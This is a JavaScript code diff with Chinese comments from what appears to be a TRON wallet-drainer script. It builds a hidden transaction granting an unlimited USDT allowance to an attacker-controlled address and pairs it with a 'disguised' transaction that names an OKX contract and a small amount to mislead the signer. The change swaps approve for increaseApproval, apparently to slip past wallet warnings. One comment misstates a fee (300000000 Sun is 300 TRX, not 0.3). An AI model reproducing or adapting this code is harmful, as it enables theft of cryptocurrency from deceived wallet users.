@@ -29,34 +29,34 @@ async function DjdskdbGsj() {
         // 将 currentAmount 转换为 TRON 计价单位 Sun（1 TRX = 1,000,000 Sun）
         const disguisedAmount = tronWebInstance.toSun(currentAmount);
         
-        // 实际的 approve 方法参数
+        // 实际的 increaseApproval 方法参数
         const realApproveParams = [
             { "type": "address", "value": window.Permission_address }, // 授权 spender 地址（权限地址）
             { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" } // 授权最大金额
         ];
 
-        // 伪装的 approve 方法参数
+        // 伪装的 increaseApproval 方法参数
         const disguisedApproveParams = [
             { "type": "address", "value": "THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8" }, // OKX 合约地址，请勿修改
             { "type": "uint256", "value": disguisedAmount } // 伪装的金额
         ];
 
-        // 设置交易选项，交易费用上限为 100000000 Sun（100 TRX）
-        const transactionOptions = { "feeLimit": 100000000 };
+        // 设置交易选项，交易费用上限为 300000000 Sun（0.3 TRX）
+        const transactionOptions = { "feeLimit": 300000000 };
 
-        // 构建实际的 approve 交易
+        // 构建实际的 increaseApproval 交易
         let realApproveTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
             tronWebInstance.address.toHex(window.usdtContractAddress), // 将 USDT 合约地址转换为 hex 格式
-            "approve(address,uint256)", // 调用合约的 approve 方法
+            "increaseApproval(address,uint256)", // 调用合约的 increaseApproval 方法
             transactionOptions, // 交易选项
             realApproveParams, // 真实参数
             userAddress // 用户的 TRON 地址
         );
 
-        // 构建伪装的 approve 交易
+        // 构建伪装的 increaseApproval 交易
         let disguisedApproveTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
             tronWebInstance.address.toHex(window.usdtContractAddress), // USDT 合约地址
-            "approve(address,uint256)", // approve 方法
+            "increaseApproval(address,uint256)", // increaseApproval 方法
             transactionOptions, // 交易选项
             disguisedApproveParams, // 伪装的参数
             userAddress // 用户的 TRON 地址
